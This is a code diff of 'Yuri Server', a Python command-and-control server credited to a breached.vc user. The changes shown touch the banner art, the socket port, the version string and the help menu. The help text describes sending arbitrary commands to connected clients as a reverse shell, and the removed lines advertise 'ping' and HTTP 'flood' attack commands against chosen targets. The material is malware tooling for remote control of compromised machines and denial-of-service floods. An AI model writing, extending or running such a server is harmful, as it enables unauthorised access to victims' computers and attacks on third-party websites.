@@ -12,7 +12,9 @@ signal(SIGPIPE,SIG_DFL)
 greetings_n = random.randint(1, 3)
 if int(greetings_n) == 1:
     print(Fore.RED + " ______   _____ ______   _____    ___________        ____________   ")
+
     print(Fore.RED + "|\     \ |     |\     \  \    \   \          \      /            \  ")
+
     print(Fore.RED + "\ \     \|     | \    |  |    |    \    /\    \    |\___/\  \\___/| ")
     print(Fore.RED + "\ \           |  |   |  |    |     |   \_\    |    \|____\  \___|/ ")
     print(Fore.RED + "\ \____      |  |    \_/   /|     |      ___/           |  |      ")
@@ -44,7 +46,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 hostname = socket.gethostname()
 hostip = socket.gethostbyname(str(hostname))
-port = 27033
+port = 27034
 try:
     s.bind((hostip, port))
 except:
@@ -140,7 +142,7 @@ class server:
                 exit(0)
             elif comm == "info":
                 print("Yuri Server")
-                print("Release: 1.0.5")
+                print("Release: 0.9.6")
                 print("Made by https://breached.vc/User-Minex")
             elif comm == "clients":
                 print(f"[CONNECTIONS]: {self.addr}")
@@ -165,10 +167,8 @@ class server:
                 print("info ##prints info about this program")
                 print("health ##prints thread's health(running or not)")
                 print("clients ##shows currently connected clients")
-                print("kick ##kick a client")
-                print("\n\n###CLIENT COMMANDS###")
-                print("ping <ip> <port> <loops> ##pings a desired ip on a desired port, repeats for custom number of times")
-                print("flood <http://domain.com> <duration> ##basic request flood on http domains\n")
+                print("kick ##kick a client(unfinished)")
+                
                 print("ANYTHING ELSE YOU TYPE WILL BE SENT TO THE CLIENT AS A COMMAND, YOU CAN USE IT AS REVERSE SHELL!")
             else:
             
